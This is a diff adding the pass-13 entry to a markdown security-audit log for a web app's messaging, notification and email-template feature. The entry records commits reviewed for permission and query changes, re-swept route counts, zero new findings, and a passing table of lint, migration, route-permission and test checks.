+  `screening_type`/`requirement_id`. `logger.error(...)` passes
+  `item.record_id` (an id) as a positional argument alongside the message
+  template, never an f-string combined with logger args (Pitfall #33).
+- **Frontend forms-review commits touching this feature's files**
+  (`917244bac` NotificationsPage.tsx, `1c02bdd06` SuggestionBoxFormModal.tsx,
+  `a0823cfd3` MessageComposeForm.tsx — all "say what is missing, on the
+  field" UX passes) — grepped all three for `window.confirm`/`alert`/
+  `prompt` and bare `?? undefined` on form values: none introduced. Not a
+  behavior change to this feature's security surface, confirmed rather than
+  assumed from the commit message's own description.
+- **`23fea4e2f`/`7884706fa`'s touches to `communicationsServices.ts`** — both
+  add only TypeScript interface/type declarations (Community Engagement
+  report shapes; `ActionItemPage`/`source_title`/`carried_forward` fields),
+  no new API call logic, so neither changes this shared file's own request
+  behavior.
+- **`6bd43cb50`/`580e7aa5d`'s touches to `MessagesAdminPage.tsx`,
+  `EmailTemplatesPage.tsx`, `MemberEmailsPage.tsx`,
+  `PhotoUseConsentPage.tsx`, `SuggestionBoxesAdminPage.tsx`** — grepped the
+  diffs for `ProtectedRoute`/`requiredPermission`/permission-check changes:
+  none in these files (the side-menu gating fix in `580e7aa5d` that _does_
+  change a permission gate is scoped to Organization Settings sub-items —
+  Audit Log, Security Alerts, QR Code Analytics, Role Management — none of
+  which are this feature's own routes). The touches here are
+  `AdminPageHeader` swaps and button-color/description cosmetics only.
+
+### Re-swept, unchanged since pass 12
+
+- **Route count: 52** (13 + 2 + 20 + 17), re-enumerated by walking all four
+  endpoint files' decorators by AST from scratch — up from pass 12's 51,
+  accounted for entirely by the three new `email_templates.py` routes above
+  (16 → 17; `messages.py`/`message_history.py`/`notifications.py` unchanged
+  at 13/2/20).
+- `SMSService(` call sites: still exactly `notification_channels.py` and
+  `message_delivery_service.py:582`.
+- `.ilike(`/`.like(` sites: unchanged, still pass `escape=LIKE_ESCAPE_CHAR`
+  with a `like_pattern()`-built pattern.
+- Standing findings MSG-3, MAIL-4, `email_service.py`'s F4, and the
+  `NotificationRuleCreate`/`Update.config` unbounded-JSON note: unchanged,
+  deliberate, by-design — none touched by this delta.
+- `push_service.py`/`push_dispatch.py`: unchanged by this delta (not in the
+  commit list above), not re-read line-by-line since pass 12 already
+  covers them in full.
+
+**0 new findings.** No route gained or lost a permission; no by-id query
+lost its organization filter; the one genuinely new unbounded-growth-shaped
+surface (none this pass — the screening-reminder sender's growth is a
+one-row-per-tier insert bounded by `REMINDER_TIERS`, not unbounded); the
+one new mutation into a JSON settings column used `copy.deepcopy()`
+correctly; and the pass's own biggest change (the credential-template link
+policy) is independently audited, tested, and could not be traced to a
+bypass in the time available.
+
+## Guard tests added (pass 13)
+
+None — every reviewed change ships with its own test
+(`test_email_template_credential_protection.py`, the screening-reminder and
+forms-review suites), and this pass found no new finding requiring its own
+guard test.
+
+## Completion gate (pass 13)
+
+| Check                                                                                                                                                                                      | Result                                                      |
+| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------- |
+| `flake8 app/ tests/ alembic/` (CI's pinned 7.4.1)                                                                                                                                          | ✅ clean                                                    |
+| `black --check app/ tests/ alembic/` (CI's pinned 26.10.1)                                                                                                                                 | ✅ clean — 3,106 files unchanged                            |
+| `isort --check-only app/ tests/ alembic/` (CI's pinned 9.0.2)                                                                                                                              | ✅ clean                                                    |
+| `python3 scripts/validate_migrations.py --strict`                                                                                                                                          | ✅ PASSED — 756 revisions, single head `8b1cf6f55425`       |
+| `python3 scripts/check_route_permissions.py --strict`                                                                                                                                      | ✅ 305 routes, 0 errors/warnings                            |
+| `pytest tests/ -q -k "messag or notification or email_template or email_theme or push_service or push_dispatch or screening_reminder or medical_screening"`                                | ✅ 2,342 passed, 1 pre-existing skip (`pywebpush` optional) |
+| `npm run typecheck`                                                                                                                                                                        | ✅ 0 errors                                                 |
+| `npm run lint`                                                                                                                                                                             | ✅ 0 errors/warnings                                        |
+| `npx vitest run src/modules/communications src/modules/notifications src/pages/NotificationsPage.test.tsx src/hooks/usePushNotifications.test.ts src/utils/devicePushSubscription.test.ts` | ✅ 302 passed (41 files)                                    |
+
+No fix was made this pass (0 findings), so nothing beyond the normal
+rotation gate was needed to verify a change; the gate above exists to show
+this delta didn't regress anything in scope, including the other sessions'
+work it re-verified (the credential-template link policy, the new
+screening-reminder sender, the new member-email-opt-outs routes).
+
+Next in rotation: Feature 26 (Forms) — re-check `list_pull_requests` fresh
+rather than trusting this note.
